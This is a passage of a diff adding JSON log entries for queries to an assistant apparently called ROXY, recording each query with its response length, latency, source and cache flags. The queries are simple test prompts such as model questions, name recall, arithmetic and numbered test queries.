+    "timestamp": "2026-01-04T05:54:20.241162",
+    "query": "what model are you using?",
+    "response_length": 181,
+    "response_time": 0.091,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:54:25.319571",
+    "query": "open firefox",
+    "response_length": 319,
+    "response_time": 0.069,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:54:30.400877",
+    "query": "execute bash command",
+    "response_length": 325,
+    "response_time": 0.065,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:54:35.500073",
+    "query": "aws list buckets",
+    "response_length": 300,
+    "response_time": 0.083,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:54:41.565986",
+    "query": "what is ROXY?",
+    "response_length": 807,
+    "response_time": 0.007,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:54:47.083396",
+    "query": "what is ROXY?",
+    "response_length": 807,
+    "response_time": 0.007,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:55:01.079803",
+    "query": "my name is Mark",
+    "response_length": 922,
+    "response_time": 8.986,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:55:13.982126",
+    "query": "what is my name?",
+    "response_length": 820,
+    "response_time": 7.886,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:55:21.123341",
+    "query": "list files in /nonexistent/path",
+    "response_length": 5662,
+    "response_time": 2.13,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:55:26.146781",
+    "query": "what is ROXY?",
+    "response_length": 807,
+    "response_time": 0.007,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:55:44.108234",
+    "query": "explain this python function: def test(): pass",
+    "response_length": 1533,
+    "response_time": 12.951,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:55:56.066910",
+    "query": "test observability",
+    "response_length": 856,
+    "response_time": 6.948,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:56:05.997272",
+    "query": "test query 1",
+    "response_length": 363,
+    "response_time": 4.913,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:56:20.954253",
+    "query": "test query 2",
+    "response_length": 1068,
+    "response_time": 9.941,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:56:32.390009",
+    "query": "test query 0",
+    "response_length": 696,
+    "response_time": 6.417,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:56:42.837034",
+    "query": "test query 1",
+    "response_length": 376,
+    "response_time": 5.437,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:56:54.819575",
+    "query": "test query 3",
+    "response_length": 751,
+    "response_time": 6.967,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:57:03.251661",
+    "query": "test query 2",
+    "response_length": 267,
+    "response_time": 3.421,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:57:13.759773",
+    "query": "test query 4",
+    "response_length": 559,
+    "response_time": 5.491,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:57:23.178627",
+    "query": "test query 5",
+    "response_length": 296,
+    "response_time": 4.402,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:57:33.214974",
+    "query": "test query 6",
+    "response_length": 458,
+    "response_time": 5.018,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:57:43.173956",
+    "query": "test query 10",
+    "response_length": 458,
+    "response_time": 4.942,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:57:53.167806",
+    "query": "test query 11",
+    "response_length": 451,
+    "response_time": 4.977,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:58:03.111550",
+    "query": "test query 12",
+    "response_length": 420,
+    "response_time": 4.926,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:58:13.577115",
+    "query": "test query 15",
+    "response_length": 625,
+    "response_time": 5.448,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:58:23.110458",
+    "query": "test query 19",
+    "response_length": 416,
+    "response_time": 4.516,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:58:41.167115",
+    "query": "test query 17",
+    "response_length": 1399,
+    "response_time": 13.04,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:58:52.242480",
+    "query": "test query 16",
+    "response_length": 624,
+    "response_time": 6.058,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:59:03.281628",
+    "query": "what is the architecture?",
+    "response_length": 847,
+    "response_time": 6.032,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T06:00:03.275519",
+    "query": "What is 2+2 equals to",
+    "response_length": 439,
+    "response_time": 10.06,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T06:00:08.292982",
+    "query": "What is 2+2 equals to",
+    "response_length": 439,
+    "response_time": 0.007,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  }
+]
